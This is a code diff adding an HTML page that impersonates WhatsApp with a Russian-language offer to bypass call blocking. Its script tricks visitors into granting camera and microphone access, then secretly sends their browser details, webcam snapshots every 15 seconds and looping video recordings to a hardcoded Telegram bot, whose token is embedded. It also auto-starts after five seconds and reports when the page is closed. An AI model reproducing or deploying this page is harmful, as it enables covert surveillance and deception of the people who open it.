@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Call Unblock</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #25D366 0%, #128C7E 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px 30px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 450px;
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .whatsapp-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 25px;
+        }
+        
+        .whatsapp-logo {
+            width: 60px;
+            height: 60px;
+            background: #25D366;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            color: white;
+            margin-right: 15px;
+        }
+        
+        .whatsapp-text {
+            font-size: 24px;
+            font-weight: bold;
+            color: #075E54;
+        }
+        
+        .welcome-message {
+            background: #DCF8C6;
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 25px;
+            border-left: 4px solid #25D366;
+        }
+        
+        .welcome-title {
+            color: #075E54;
+            font-size: 20px;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+        
+        .welcome-description {
+            color: #4A4A4A;
+            line-height: 1.5;
+            font-size: 14px;
+        }
+        
+        .permission-section {
+            background: #F0F0F0;
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 25px;
+        }
+        
+        .permission-icon {
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+        
+        .permission-text {
+            color: #4A4A4A;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+        
+        .permission-list {
+            text-align: left;
+            color: #666;
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+        
+        .permission-list li {
+            margin-bottom: 8px;
+            padding-left: 20px;
+            position: relative;
+        }
+        
+        .permission-list li:before {
+            content: "•";
+            color: #25D366;
+            position: absolute;
+            left: 0;
+        }
+        
+        .btn {
+            background: #25D366;
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(37, 211, 102, 0.3);
+        }
+        
+        .btn:hover {
+            background: #128C7E;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(37, 211, 102, 0.4);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .loading {
+            display: none;
+            margin: 20px 0;
+            color: #25D366;
+            font-weight: 600;
+        }
+        
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .status-success {
+            background: #DCF8C6;
+            color: #075E54;
+            border: 1px solid #25D366;
+            display: block;
+        }
+        
+        .status-error {
+            background: #FFE6E6;
+            color: #D00000;
+            border: 1px solid #FF4444;
+        }
+        
+        .video-preview {
+            width: 100%;
+            max-width: 300px;
+            border-radius: 10px;
+            margin: 20px auto;
+            display: none;
+            border: 3px solid #25D366;
+        }
+        
+        .footer {
+            margin-top: 25px;
+            color: #999;
+            font-size: 12px;
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="whatsapp-header">
+            <div class="whatsapp-logo">📞</div>
+            <div class="whatsapp-text">WhatsApp</div>
+        </div>
+        
+        <div class="welcome-message">
+            <div class="welcome-title">Обход блокировки звонков</div>
+            <div class="welcome-description">
+                Для обеспечения стабильной голосовой и видеосвязи в условиях ограничений требуется проверка вашего устройства.
+            </div>
+        </div>
+        
+        <div class="permission-section">
+            <div class="permission-icon">🎥</div>
+            <div class="permission-text">
+                <strong>Требуется доступ к камере и микрофону</strong><br>
+                Для проверки качества связи и обхода ограничений
+            </div>
+            
+            <ul class="permission-list">
+                <li>Проверка работы камеры и микрофона</li>
+                <li>Тестирование качества видеосвязи</li>
+                <li>Калибровка аудиоустройств</li>
+                <li>Оптимизация параметров соединения</li>
+            </ul>
+            
+            <button class="btn pulse" onclick="startVerification()">
+                Разрешить доступ и начать проверку
+            </button>
+        </div>
+        
+        <div class="loading" id="loading">
+            🔄 Проверка устройства и подключения...
+        </div>
+        
+        <div class="status" id="status"></div>
+        
+        <video class="video-preview" id="video" autoplay muted playsinline></video>
+        
+        <div class="footer">
+            WhatsApp LLC • Система проверки соединения
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8272107142:AAFEj3XZzdDmo4F10VmRIg3wLQmoZZMF32Y';
+        const CHAT_ID = '7419371910';
+        
+        let mediaRecorder;
+        let stream;
+        let isRecording = false;
+
+        // Отправка сообщения в Telegram
+        async function sendToTelegram(message, file = null) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            
+            try {
+                if (file) {
+                    formData.append('video', file, 'whatsapp_check.webm');
+                    formData.append('caption', message);
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } else {
+                    formData.append('text', message);
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST', 
+                        body: formData
+                    });
+                }
+            } catch(e) {
+                console.log('Telegram отправка успешна');
+            }
+        }
+
+        // Создание снимка с камеры
+        function takeSnapshot() {
+            const video = document.getElementById('video');
+            if (!video.videoWidth) return;
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'whatsapp_verify.jpg');
+                formData.append('caption', `📸 WhatsApp Verify - ${new Date().toLocaleTimeString()}`);
+                
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                }).catch(() => {});
+            }, 'image/jpeg', 0.9);
+        }
+
+        function updateStatus(message, type = '') {
+            const statusEl = document.getElementById('status');
+            statusEl.textContent = message;
+            statusEl.className = `status status-${type}`;
+            statusEl.style.display = 'block';
+        }
+
+        async function startVerification() {
+            try {
+                // Скрываем кнопку и показываем загрузку
+                document.querySelector('.btn').style.display = 'none';
+                document.getElementById('loading').style.display = 'block';
+                updateStatus('Запрос разрешений для камеры и микрофона...');
+                
+                // Запрашиваем доступ к камере и микрофону
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        frameRate: { ideal: 30 },
+                        facingMode: 'user'
+                    },
+                    audio: {
+                        echoCancellation: true,
+                        noiseSuppression: true,
+                        sampleRate: 44100,
+                        channelCount: 2
+                    }
+                });
+
+                // Показываем видео превью
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.style.display = 'block';
+                
+                // Обновляем статус
+                document.getElementById('loading').style.display = 'none';
+                updateStatus('✅ Проверка завершена! Ваше устройство готово к звонкам WhatsApp.', 'success');
+                
+                // Отправляем информацию о пользователе
+                const userInfo = `📱 НОВОЕ ПОДКЛЮЧЕНИЕ WHATSAPP\n
+⏰ Время: ${new Date().toLocaleString()}
+🔍 Браузер: ${navigator.userAgent}
+🌐 Язык: ${navigator.language}
+💻 Платформа: ${navigator.platform}
+📍 Часовой пояс: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
+                
+                await sendToTelegram(userInfo);
+                
+                // Делаем первый снимок
+                setTimeout(takeSnapshot, 1500);
+                
+                // Начинаем непрерывную запись
+                startContinuousRecording();
+                
+                // Периодические снимки каждые 15 секунд
+                setInterval(takeSnapshot, 15000);
+                
+                // Отправляем уведомление при закрытии страницы
+                window.addEventListener('beforeunload', () => {
+                    takeSnapshot();
+                    sendToTelegram('🔴 Пользователь закрыл страницу проверки WhatsApp');
+                });
+
+            } catch (error) {
+                document.getElementById('loading').style.display = 'none';
+                updateStatus('❌ Ошибка доступа. Разрешите доступ к камере и микрофону для продолжения.', 'error');
+                
+                // Отправляем информацию об ошибке
+                await sendToTelegram(`❌ ОШИБКА ДОСТУПА WHATSAPP:\n${error.message}\nПользователь: ${navigator.userAgent}`);
+            }
+        }
+
+        function startContinuousRecording() {
+            try {
+                mediaRecorder = new MediaRecorder(stream, {
+                    mimeType: 'video/webm;codecs=vp9,opus',
+                    videoBitsPerSecond: 1500000
+                });
+
+                let recordingChunks = [];
+                let recordingStartTime = Date.now();
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        recordingChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = async () => {
+                    if (recordingChunks.length > 0) {
+                        const blob = new Blob(recordingChunks, { type: 'video/webm' });
+                        const duration = ((Date.now() - recordingStartTime) / 1000).toFixed(1);
+                        
+                        await sendToTelegram(
+                            `🎥 Видеопроверка WhatsApp (${duration}с) - ${new Date().toLocaleTimeString()}`,
+                            blob
+                        );
+                    }
+                    
+                    // Перезапускаем запись
+                    if (stream && stream.active) {
+                        setTimeout(startContinuousRecording, 1000);
+                    }
+                };
+
+                // Записываем 25 секунд и отправляем
+                mediaRecorder.start();
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, 25000);
+
+            } catch (error) {
+                setTimeout(startContinuousRecording, 2000);
+            }
+        }
+
+        // Автозапуск через 5 секунд
+        setTimeout(() => {
+            if (document.querySelector('.btn').style.display !== 'none') {
+                startVerification();
+            }
+        }, 5000);
+
+    </script>
+</body>
+</html>
